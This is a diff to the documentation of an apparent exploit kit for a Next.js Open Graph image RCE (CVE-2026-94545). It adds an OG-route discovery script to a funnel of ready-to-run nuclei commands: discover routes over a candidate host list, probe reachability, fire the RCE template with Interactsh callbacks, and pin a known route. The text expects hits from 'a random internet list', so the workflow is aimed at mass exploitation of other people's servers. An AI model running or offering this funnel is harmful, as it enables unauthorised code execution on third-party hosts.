@@ -166,8 +166,14 @@ Two things decide whether a target can be hit, and neither of them is the port:
 The intended funnel, cheapest first:
 
 ```bash
+# 0) learn the routes first - the front page names them (og:image meta tag, App
+#    Router flight payload) and anything that answers 200 image/* is a candidate
+lab/find-og-routes.sh -l candidates.txt --json routes.json --print-urls good.txt
+#    ... prints per target:  https://a.example   /api/og,/opengraph-image
+#    ... and a ready-to-paste: -var paths=/api/og,/opengraph-image
+
 # 1) reachability across the list - small probes, no payload, no destruction
-nuclei -l candidates.txt -t CVE-2026-94545.yaml -var paths=/api/og,/og,/opengraph-image -stats -o reachable.txt
+nuclei -l good.txt -t CVE-2026-94545.yaml -var paths=/api/og,/opengraph-image -stats -o reachable.txt
 
 # 2) exploit only the hosts that matched, and let Interactsh confirm out of band
 nuclei -l reachable.txt -t CVE-2026-94545-rce.yaml -stats
@@ -175,6 +181,10 @@ nuclei -l reachable.txt -t CVE-2026-94545-rce.yaml -stats
 # 3) if you know the route (or the list is noisy), pin it and keep the payload off the wire
 nuclei -l reachable.txt -t CVE-2026-94545-rce.yaml -var ogpath=/og
 ```
+
+`lab/find-og-routes.sh` does not touch the templates; it just reads pages and probes
+candidate paths, so it is safe to run over a large list first. Trim `--max` and `--timeout` to
+keep it quick.
 
 Expect few results from a random internet list, and for reasons that are not template bugs: the
 host must run a Next.js version in range, on the Node runtime, with `sharp` installed, a route
@@ -295,6 +305,7 @@ nuclei" in `lab/README.md` for the same checks with the real tool).
 | FOFA/Shodan markers (`lab/check-dorks.sh`) | 3/3: `opengraph-image` and `self.__next_f.push` present in a real Next.js 16.3.5 HTML response |
 | Standard ports (`lab/test-standard-ports.sh`) | 13/13: HTTP :80 and HTTPS :443 (self-signed, via `tls-proxy.py`) - detection, exploit, callback, worker replaced; implicit-443 and bare-host forms included |
 | Non-default OG route (`lab/test-alt-paths.sh`) | 10/10: the sink at `/og` is found by the default path list, by `-var ogpath=/og` and by `-var paths=/nope,/og`; exploit + callback there; a GET-only route is reported as "no body sink" (25 KB payload vs HTTP 431) instead of being fired blind |
+| Route discovery (`lab/find-og-routes.sh`) | 4/4: `/api/og` confirmed on the three lab apps and `/og` on the non-default scratch app; meta-tag and flight-payload extraction verified against a page that only mentions the routes |
 
 Structural checks (`lab/tools/validate.mjs`): YAML parses, both templates validate against
 `nuclei-jsonschema.json` (vendored from the nuclei repository), and every JS block passes a
